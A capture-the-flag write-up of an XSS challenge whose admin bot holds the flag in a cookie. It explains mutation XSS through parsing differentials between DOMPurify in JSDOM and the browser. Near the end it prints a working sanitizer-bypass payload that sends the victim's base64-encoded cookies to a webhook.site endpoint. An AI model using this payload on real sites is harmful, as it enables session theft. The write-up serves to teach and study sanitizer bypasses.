## Challenge Description
![[Screenshot 2026-04-16 at 1.36.47 PM.png]]

![[Screenshot 2026-04-16 at 1.37.21 PM.png]]
A site where you can see what other people say about the smell of their purifier. We are given an attachment too, let's take a look at that too. 
![[Screenshot 2026-04-16 at 1.41.55 PM.png|227]]
Looking at the code structure, we can guess that it's 100% an xss, because we can see admin_bot, which means the bot is going to read something and we need to get the flag from its cookie so xss is the way we can think of.
![[Screenshot 2026-04-16 at 1.42.49 PM.png]]
In one of the file, we can see, DOMPurify and JSDom are being used.
JSDOM is a pure-JavaScript implementation of web standards, specifically the **[WHATWG DOM and HTML Standards](https://www.npmjs.com/package/jsdom)**.
DOMPurify is a high-performance, "uber-tolerant" **[XSS (Cross-Site Scripting) sanitizer](https://www.npmjs.com/package/dompurify)** for HTML, MathML, and SVG.
Which means, it's going to be tough to break through the DOMPurify. But anyways, lets get back to the google search. 
![[Screenshot 2026-04-16 at 1.44.27 PM.png]]
We will keep the version of DOMPurify and JSDOM in mind.
Found a research paper, which was quite helpful https://www.ias.cs.tu-bs.de/publications/parsing_differentials.pdf.
We will setup a test environment to test our payload before we inject the payload on the actual site.
The core concept from the paper is:
**Sanitizers and browsers don’t understand HTML the same way.**

Because of this:
- The sanitizer thinks something is **safe**
- But the browser later interprets it as **dangerous**
This mismatch is called: **Parsing Differential**

The vulnerability exists because the HTML sanitizer and the browser do not interpret HTML in the same way. The sanitizer processes user input and decides what is safe based on its own parsing logic. However, browsers use a different and more complex parsing process, which can interpret the same content differently.

As a result, input that appears safe after sanitization can be transformed or “mutated” when the browser parses it, turning it into executable code. This is known as a **parsing differential** and can lead to **mutation-based XSS (mXSS)**, where harmless-looking content becomes dangerous after being processed.

In short, the sanitizer’s understanding of the HTML does not match the browser’s, allowing attackers to bypass security checks.
![[Screenshot 2026-04-16 at 1.54.30 PM.png]]
This is wonderful explanation. 
We can modify the payload to:
```js
<svg><style>&lt;img src=x onerror=fetch('https://webhook.site/<endpoint>?c='+btoa(document.cookie))&gt;<keygen>
```
We can see the webhook site and it has a get parameter, let's decode it.
![[Screenshot 2026-04-16 at 2.00.14 PM.png]]
![[Screenshot 2026-04-16 at 2.01.21 PM.png]]
Here's the flag.